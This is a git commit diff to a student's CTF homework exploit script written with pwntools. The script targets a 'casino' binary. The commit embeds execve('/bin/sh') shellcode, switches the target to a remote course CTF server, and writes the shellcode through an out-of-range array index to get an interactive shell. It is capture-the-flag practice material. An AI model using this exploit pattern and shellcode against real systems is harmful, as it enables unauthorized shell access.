99241586dab65503d0a8fa04250799201bd6f14e
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-11-16 16:29:09 +0800

    Check vulnerability for guess array

--- Hw0x05/solve.py
+++ Hw0x05/solve.py
@@ -5,7 +5,6 @@ from pwn import *
 context.clear(arch='x86_64')
 # sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
 sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-print(len(sc), 'shellcode is ', sc)
 
 # random number
 p = process("./gen_num.out")
@@ -15,9 +14,9 @@ p.close()
 
 
 # send
-r = process("./casino")
+# r = process("./casino")
 # elf = ELF("./casino")
-# r = remote('edu-ctf.csie.org', 10172)
+r = remote('edu-ctf.csie.org', 10172)
 r.sendlineafter('name: ', 'AAAAAA')
 r.sendlineafter('age: ', '40')
 
@@ -29,27 +28,16 @@ for cnt_try in range(0, 2):
     cnt_num = 0
     for i in numbers:
         r_out = 'Chose the number ' + str(cnt_num) + ': '
-        r.recvuntil(r_out)
-
-        payload = ''
-        for j in range(4):
-            if sc_idx < len(sc):
-                payload += sc[sc_idx]
-                sc_idx = sc_idx + 1
-            else:
-                break
-
-        if sc_idx != len(sc):
-            print('sendpayload ', payload)
-            r.sendline(payload)
-        else:
-            r.sendline(i)
-
+        r.sendlineafter(r_out, i)
         cnt_num += 1
 
     r.recvuntil(':no]: ')
-    r.sendline('0')
-    print(r.recvline())
+    r.sendline('1')
 
-#r.interactive()
+    r.recvuntil('[1 ~ 6]: ')
+    r.sendline(str(offset + 1))
+    r.recvuntil(': ')
+    r.sendline(sc)
+
+r.interactive()
 r.close()
